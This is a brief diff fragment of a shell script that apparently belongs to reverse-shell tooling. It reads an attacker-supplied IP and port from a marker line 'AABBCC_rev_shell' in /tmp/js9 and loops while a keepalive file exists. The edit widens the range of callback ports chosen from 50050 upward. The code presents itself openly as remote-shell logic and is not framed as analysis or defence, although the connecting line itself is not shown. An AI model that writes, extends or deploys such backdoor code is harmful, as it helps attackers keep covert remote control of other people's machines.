@@ -21,7 +21,7 @@ grep -q AABBCC_rev_shell /tmp/js9 &&
 
     (while true; do
         [ ! -f /tmp/keepalive ] && break        
-         num67z=$(date +%S);num76=$((${num67z}%2));
+         num67z=$(date +%S);num76=$((${num67z}%8));
          bport=5005"$num76";echo $bport;
 
 ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9)
